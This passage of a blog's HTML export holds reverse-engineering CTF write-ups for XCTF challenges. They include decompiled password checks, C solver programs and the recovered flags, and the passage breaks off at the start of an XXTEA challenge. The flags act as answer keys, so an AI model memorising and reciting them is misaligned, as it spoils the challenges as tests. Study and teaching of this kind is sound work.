__cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1E0h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+F0h] [rbp-F0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please Input Key: &quot;</span>, <span class="number">0L</span>L);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v5);</span><br><span class="line">  encode(&amp;v5, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;v5) == key )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s, enflag) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are Right&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;flag&#123;This_1s_f4cker_flag&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">40</span>]; <span class="comment">// [rsp+50h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) != key )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your Length is Wrong&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; key; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] = key ^ (a1[i] + <span class="number">6</span>);</span><br><span class="line">    v4[i + <span class="number">1</span>] = (a1[i + <span class="number">1</span>] - <span class="number">6</span>) ^ key;</span><br><span class="line">    v3[i + <span class="number">2</span>] = a1[i + <span class="number">2</span>] ^ <span class="number">6</span> ^ key;</span><br><span class="line">    *(_BYTE *)(a2 + i) = v5[i];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">1L</span>L) = v4[i + <span class="number">1</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">2L</span>L) = v3[i + <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑很清晰，直接写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> f[<span class="number">18</span>]=<span class="string">&quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> i,j,k;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i+=<span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    f[i]=(f[i]^<span class="number">18</span>)<span class="number">-6</span>;</span><br><span class="line">    f[i+<span class="number">1</span>]=(f[i+<span class="number">1</span>]^<span class="number">18</span>)+<span class="number">6</span>;</span><br><span class="line">    f[i+<span class="number">2</span>]=f[i+<span class="number">2</span>]^<span class="number">18</span>^<span class="number">6</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>,f[i],f[i+<span class="number">1</span>],f[i+<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>unctf{b66_6b6_66b}</p></blockquote><h1 id="Reversing-x64Elf-100"><a href="#Reversing-x64Elf-100" class="headerlink" title="Reversing-x64Elf-100"></a>Reversing-x64Elf-100</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4826&page=1">题目链接</a><br>拖入ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">255</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( sub_4006FD(&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect password!&quot;</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nice!&quot;</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_4006FD</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="string">&quot;Dufhbmf&quot;</span>;</span><br><span class="line">  v4 = <span class="string">&quot;pG`imos&quot;</span>;</span><br><span class="line">  v5 = <span class="string">&quot;ewUglpt&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;v3)[i % <span class="number">3</span>][<span class="number">2</span> * (i / <span class="number">3</span>)] - *(i + a1) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>白给</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">3</span>][<span class="number">7</span>]=&#123;&#123;<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;f&#x27;</span>&#125;,&#123;<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;s&#x27;</span>&#125;,&#123;<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;g</span></span><br><span class="line">  &#x27;,&#x27;l&#x27;,&#x27;p&#x27;,&#x27;t&#x27;&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">11</span>];</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]=a[i % <span class="number">3</span>][<span class="number">2</span> * (i / <span class="number">3</span>)]<span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Code_Talkers</p></blockquote><h1 id="IgniteMe"><a href="#IgniteMe" class="headerlink" title="IgniteMe"></a>IgniteMe</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4590&page=1">题目链接</a><br>ida32打开</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">  v3 = sub_402B30(&amp;unk_446360, <span class="string">&quot;Give me your flag:&quot;</span>);</span><br><span class="line">  sub_4013F0(v3, sub_403670);</span><br><span class="line">  sub_401440(v11, <span class="number">127</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v11) &lt; <span class="number">0x1E</span> &amp;&amp; <span class="built_in">strlen</span>(v11) &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(v10, <span class="string">&quot;EIS&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(v10); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v11[i] != v10[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = sub_402B30(&amp;unk_446360, <span class="string">&quot;Sorry, keep trying! &quot;</span>);</span><br><span class="line">        sub_4013F0(v6, sub_403670);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v12 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sub_4011C0(v11) )</span><br><span class="line">        v8 = sub_402B30(&amp;unk_446360, <span class="string">&quot;Congratulations! &quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v8 = sub_402B30(&amp;unk_446360, <span class="string">&quot;Sorry, keep trying! &quot;</span>);</span><br><span class="line">      sub_4013F0(v8, sub_403670);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = sub_402B30(&amp;unk_446360, <span class="string">&quot;Sorry, keep trying! &quot;</span>);</span><br><span class="line">      sub_4013F0(v7, sub_403670);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_402B30(&amp;unk_446360, <span class="string">&quot;Sorry, keep trying!&quot;</span>);</span><br><span class="line">    sub_4013F0(v4, sub_403670);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __cdecl <span class="title">sub_4011C0</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+50h] [ebp-B0h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">32</span>]; <span class="comment">// [esp+54h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+74h] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+78h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">128</span>]; <span class="comment">// [esp+80h] [ebp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) &lt;= <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">4</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; <span class="built_in">strlen</span>(a1) - <span class="number">1</span> )</span><br><span class="line">    v8[v6++] = a1[i++];</span><br><span class="line">  v8[v6] = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(v8);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8[i] &gt;= <span class="number">97</span> &amp;&amp; v8[i] &lt;= <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8[i] -= <span class="number">32</span>;</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v3 &amp;&amp; v8[i] &gt;= <span class="number">65</span> &amp;&amp; v8[i] &lt;= <span class="number">90</span> )</span><br><span class="line">      v8[i] += <span class="number">32</span>;</span><br><span class="line">    v4[i] = byte_4420B0[i] ^ sub_4013C0(v8[i]);</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(<span class="string">&quot;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&quot;</span>, v4) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题就是输入flag，然后大小写相互变化，最后再异或。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">32</span>]=&#123;<span class="number">0x0D</span>,<span class="number">0x13</span>,<span class="number">0x17</span>,<span class="number">0x11</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x20</span>,<span class="number">0x1D</span>,<span class="number">0x0C</span>,<span class="number">0x02</span>,<span class="number">0x19</span>,<span class="number">0x2F</span>,<span class="number">0x17</span>,<span class="number">0x2B</span>,</span><br><span class="line">        <span class="number">0x24</span>,<span class="number">0x1F</span>,<span class="number">0x1E</span>,<span class="number">0x16</span>,<span class="number">0x09</span>,<span class="number">0x0F</span>,<span class="number">0x15</span>,<span class="number">0x27</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x0A</span>,<span class="number">0x2F</span>,<span class="number">0x1E</span>,<span class="number">0x1A</span>,<span class="number">0x2D</span>,</span><br><span class="line"><span class="number">0x0C</span>,<span class="number">0x22</span>,<span class="number">0x04</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">24</span>]=<span class="string">&quot;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> i,j,v3=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">    b[i]=((b[i]^a[i])<span class="number">-72</span>)^<span class="number">0x55</span>;</span><br><span class="line">    <span class="keyword">if</span> ( b[i] &gt;= <span class="number">97</span> &amp;&amp; b[i] &lt;= <span class="number">122</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            b[i] -= <span class="number">32</span>;</span><br><span class="line">            v3 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !v3 &amp;&amp; b[i] &gt;= <span class="number">65</span> &amp;&amp; b[i] &lt;= <span class="number">90</span> )</span><br><span class="line">            b[i] += <span class="number">32</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>wadx_tdgk_aihc_ihkn_pjlm</p></blockquote><h1 id="easyRE1"><a href="#easyRE1" class="headerlink" title="easyRE1"></a>easyRE1</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=5592&page=2">题目链接</a><br>ida直接看main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is the password?&quot;</span>);</span><br><span class="line">  gets(&amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;the password&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;FLAG:db2f62a36a018bce28e46d976e3f9864&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试着提交一下，对了。</p><blockquote><p>flag{db2f62a36a018bce28e46d976e3f9864}</p></blockquote><h1 id="ReverseMe-120"><a href="#ReverseMe-120" class="headerlink" title="ReverseMe-120"></a>ReverseMe-120</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4825&page=2">题目链接</a><br>ida32打开，查看字符串。</p><p><img src="/2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ReverseMe-120.png"></p><p>这道题很可能与base家族有关。</p><p><img src="/2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/1.png"></p><p>main函数里的运算只有41-44行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>]=<span class="string">&quot;you_know_how_to_remove_junk_code&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a); i++ )</span><br><span class="line">    &#123;</span><br><span class="line">    a[i] ^= <span class="number">0x25</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常情况下，再base64解码就出来了，但这道题竟然是加密，以后还是要认真看ida里的函数。</p><blockquote><p>XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame</title>
      <link href="/2021/03/01/hgame/"/>
      <url>/2021/03/01/hgame/</url>
      
        <content type="html"><![CDATA[<h1 id="apacha"><a href="#apacha" class="headerlink" title="apacha"></a>apacha</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1M0GtstGLe4Gge1fknju5hQ">题目附件</a>提取码：89ri<br>xxtea加密<br><a href="http://www.elecfans.com/emb/danpianji/20110825212016.html">XXTEA加密算法的原理及其C语言实现</a><br>拖入ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+0h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+4h] 